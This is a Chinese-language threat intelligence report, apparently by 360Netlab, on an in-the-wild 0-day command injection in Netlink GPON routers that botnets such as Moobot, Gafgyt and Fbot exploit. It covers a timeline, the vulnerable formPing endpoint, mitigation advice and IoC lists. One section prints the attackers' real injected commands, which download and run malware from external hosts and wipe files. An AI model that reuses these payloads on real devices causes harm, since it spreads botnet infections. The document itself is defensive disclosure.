### 大致情况

 **这是我们过去30天内的第3篇IoT 0-day漏洞文章，之前我们还披露了DrayTek
Router在野0-day漏洞分析报告[[1]](https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/)，LILIN
DVR在野0-day漏洞分析报告[[2]](https://blog.netlab.360.com/multiple-botnets-are-spreading-using-lilin-dvr-0-day-en/)。我们观察到僵尸网络存在相互竞争获取更多的Bot规模的情况，其中有些僵尸网络拥有一些0-day漏洞资源，这使它们看起来与众不同。我们正在研究并观察IoT
Botnet使用0-day漏洞传播是否是一个新趋势。**

2020年2月28日，360Netlab未知威胁检测系统注意到Moobot僵尸网络[[3]](https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/)开始使用一种我们从未见过的新漏洞(多个步骤)，并且可以成功攻击受影响的设备。

2020年3月17日，我们确认此漏洞为0-day漏洞，并将结果报告给CNCERT。

2020年3月18日，Exploit Database[[4]](https://www.exploit-db.com/exploits/48225)网站发布了Netlink
GPON路由器远程命令执行漏洞PoC，这与我们发现的在野0-day漏洞特征一致。但是，该PoC遗漏了关键的一个步骤，因此实际被注入的命令并不能成功执行。

2020年3月19日，我们与相关厂商联系，被告知设备出厂默认都只开放在LAN侧，确认存在漏洞。

2020年3月19日，我们注意到一个攻击者根据公开的PoC传播Gafgyt僵尸网络。在3月26号，该攻击者将该漏洞集成到Bot中，并进行互联网范围内蠕虫式扫描。![img](https://image.3001.net/images/20200416/1587003067_5e97bebbad5b9.jpg!small)

幸运的是，该PoC遗漏了关键的一个步骤，扫描通常会失败。![img](https://image.3001.net/images/20200416/1587003113_5e97bee9ab18e.jpg!small)

2020年3月24日，我们注意到另一个攻击者根据公开的PoC传播Fbot僵尸网络，也很快地结束了传播。

目前，我们已经发现共有9款型号的路由器中存在同样的漏洞，很可能他们都是同一原始供应商的OEM产品。

### target_addr命令注入漏洞分析

漏洞类型：需要授权的远程命令执行漏洞漏洞原因：在设备 `/bin/boa`
Web服务端程序内，存在2个函数`formPing()`和`formTracert()`。它们在处理 `/boaform/admin/formPing`
POST请求时，未检查`target_addr`参数就调用系统`ping`命令，从而导致命令注入漏洞。![img](https://image.3001.net/images/20200416/1587003122_5e97bef2a293e.jpg!small)

### 注入命令列表

    
    
    %3Bwget%20http://45.58.148.50/n%20-O-|sh
    %3Bwget%20http://185.61.138.46/n%20-O-|sh
    %3Bwget%20http://194.180.224.13/n%20-O-|sh
    %3Bwget%20http://194.180.224.113/n%20-O-|sh
    ;'+payload+'%20/
    ;cd /tmp; rm -rf *; busybox wget http://51.254.23.227/bins/n; chmod 777 n; sh n; rm -rf * /
    ;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/mips; chmod 777 mips; ./mips; rm -rf * /
    ;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/n; chmod 777 n; sh n; rm -rf * /
    ;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/netlink; chmod 777 netlink; ./netlink /
    ;cd /tmp; rm -rf *; wget http://51.254.23.227/bins/polaris.mips; chmod 777 polaris.mips; ./polaris.mips /
    ;cd /tmp; rm -rf *; wget http://6735a55d.ngrok.io/bins/mips; chmod 777 mips; ./mips; rm -rf * /
    ;cd /tmp; rm -rf *; wget http://58680dd9.ngrok.io/bins/mips; chmod 777 mips; ./mips; rm -rf * /
    ;cd /tmp; rm -rf *; wget http://58680dd9.ngrok.io/bins/sh; chmod 777 sh; sh sh; rm -rf * /
    ;cd /tmp; rm -rf mips; wget http://164.132.92.168:6479/bins/mips; busybox wget http://164.132.92.168:6479/bins/mips; chmod 777 mips; ./mips /
    ;cd /tmp; rm -rf viktor.mips; wget http://164.132.92.168:6479/bins/viktor.mips; busybox wget http://164.132.92.168:6479/bins/viktor.mips; chmod 777 viktor.mips; ./viktor.mips /
    ;ls /
    ;wget http://194.180.224.249/bignigger
    ;wget http://194.180.224.249/muck.sh -O - | sh
    

### 处置建议

我们建议相关运营商检查是否存在漏洞型号设备，默认账号密码等问题，并更新设备固件系统。

我们建议读者对相关域名、IP和URL进行监控和封锁。

使用我们DNSmon的用户，本文涉及的IoC相关域名很早就被自动阻断访问。

### IoC list

C2

    
    
    nlocalhost.wordtheminer.com:9746
    164.132.92.173:123
    51.254.23.237:100
    attack.niggers.me:443
    

MD5

    
    
    0a99f9b0472e2e4b9b20657cdde90bbb
    0b00195d6162464cbb058024301fc4f3
    0bd6066e0fab5d189dc32a7025c99b4d
    006581bacd9109b1bf9ee226e4b53c69
    05cbda6d4461900bfedf1d126a1f281a
    05078ea74df7bb588b5bf984dd0c357f
    07b3523f46aa5ed101c0a9f27a0464d9
    089a20cf6b2380348f603acf70d8e998
    0928b37ce3a9198bdc7c3f54baac396a
    1f6874ecffc52d54a4675d7246e326ad
    3c08f24b98fb6f9c6b1c9ff20e5a2d1f
    3cc06f2dc303be2375fef418b58e42ca
    4b4f95d7197f0b0ee84d5ae3941c62b4
    5ed943a527353324fa3192b4aaa39b03
    6fb9a25d3f645ec6e7ed74801fbd3e16
    7ad034dc8413956d480b8f348c890c33
    7cfa0eed3a610e0d8e415110b3e65190
    7e735868bc62ccae67512847b2a75c9d
    8af7c440b85e2c44a2a15fde317c6f65
    8b708283e5515f6b4438224124f671c4
    8be297b73621818d872c711234b3daec
    9a4a798ddabbb58f02773641b618cb74
    9cd6deb2d2637243cb4eb11cac6d5cb2
    18be5888d4e0da8933fced78f9fb0960
    24c328bd0fef770212e3e03be8024993
    24ed1ceccdadc19da00aebc3e769d794
    25e8d81f0c5157adef22a32c74114e8c
    38a6342ed08ccae066858a246d67f73d
    50a997f7b5bd1018946caf9117874227
    55c4ba138f8679fac72b48ab3566d888
    56c71251ebd86c96b6a9c615424a6c8e
    80f210834cbbc5415e6045c24b399835
    82bae571fdfec253fe293311ce4e9c0d
    82cb1a36cc1b659e81e1fe3a5eb5abb6
    83c279c71cea9d8ab5b6bd0b2a5aa0f1
    93f4f875eb0a77abdc138bdd3dc72ec7
    99ee1cc30563217124f11627300661d5
    223cb9629da3f70d145207763f081e01
    413ba8d86b38a04b7263fc8aa8fb14e6
    570dca60a3a719962d92ef4549261903
    592c30e702806f57a9158db25750928c
    723ebfee5a8d7695fcfafffa75fc40ab
    885a52c1950be769b8659889473dc918
    949eed7cfe25e6e340aec864fd4becdb
    1137f1737e59324e1c237cbe8b91bc57
    3386ee08387596f4edc6881caf2407cc
    7472ba599c4e6427ccddeabdc031035d
    9933d4f6dcb59d1344a47a29c79ff619
    73258bf7b4784c551f40cbe672e2748e
    76154ed76f33b66973d119c43200f194
    91558b8e5ea1a892dc21181460c3e0eb
    534798f4d3ea49d6378258358eed10de
    623306bcdb9c7ceef47fb47c3266aee9
    733270de5536997f0b5f23b8b4f21587
    2005292c8c5d4d67b4d051f981a50981
    3404206dc241f0865e6b2091f0e506c6
    6111797820074d3490daedb22003321e
    a5c256db29494179e817ea7c1974773e
    a2763e44896d946937b5c9f9f3171d95
    aa925baa97fab54a80485c82b64104c7
    ab6c2fa4af05c20909d1383091287e5b
    b053d3e6d89a26c4c8edf19cde775d90
    b8bfde19f504d0c0e55e830a9439d8d9
    b918ac324f4ea6b1b8773d2899318555
    bc458b7d42cac8d41aa02a752a75542e
    bd2d93ec4eabb6578c370ab5dbc26ded
    c5e508ea2f0c4c34c7917201346b0893
    c6af537d5de188d142658377a51d2212
    c800304fb7e6845986d673ce39cbb2d0
    cb3fdb886b993e6179a24ec733714882
    cdc8cae31e929d99f9aab047329954e5
    d1b97657a7e9c75003e522adf0f606f3
    d8498b50166021c97c153e33088b2b87
    dbb6b9d0bec577e853f85644774608d3
    de6bb3ec243cae920cb70fb52c40e8d2
    df1e5beba9e9635aa5f072133373d3da
    e01ab8c37afbfcfb19083163c0045495
    eee0f46d0739fb37d552f350b0608334
    f80d4bcf45266e62118755f290dd1f51
    fbbab3a8befa60093986c1d447629d7e
    fc397251bde53241f2a3826395eca61b
    fe2c07723d0864bb2c3976058af8c67d
    

URL

    
    
    http://45.58.148.50/n
    
    http://51.254.23.227/bins/mips
    
    http://51.254.23.227/bins/n
    
    http://51.254.23.227/bins/netlink
    
    http://51.254.23.227/bins/polaris.mips
    
    http://164.132.92.168:6479/bins/mips
    
    http://164.132.92.168:6479/bins/viktor.mips
    
    http://185.61.138.46/n
    http://194.180.224.13/n
    
    http://194.180.224.113/n
    http://194.180.224.249/bignigger
    
    http://194.180.224.249/muck.sh
    
    http://6735a55d.ngrok.io/bins/mips
    
    http://58680dd9.ngrok.io/bins/mips
    
    http://58680dd9.ngrok.io/bins/sh

IP

    
    
    185.61.138.46           Netherlands             ASN49349                Dotsi, Unipessoal Lda.
    45.58.148.50            United States           ASN46844                Sharktech
    194.180.224.113         United States           ASN44685                Patron Technology Persia Ltd
    194.180.224.13          United States           ASN44685                Patron Technology Persia Ltd
    194.180.224.249         United States           ASN44685                Patron Technology Persia Ltd
    164.132.92.168          France                  ASN16276                OVH SAS             
    164.132.92.173          France                  ASN16276                OVH SAS             
    51.254.23.227           France                  ASN16276                OVH SAS             
    51.254.23.237           France                  ASN16276                OVH SAS
    

***本文作者：马延龙、叶根深、涂凌鸣、金晔，转载请注明来自FreeBuf.COM**

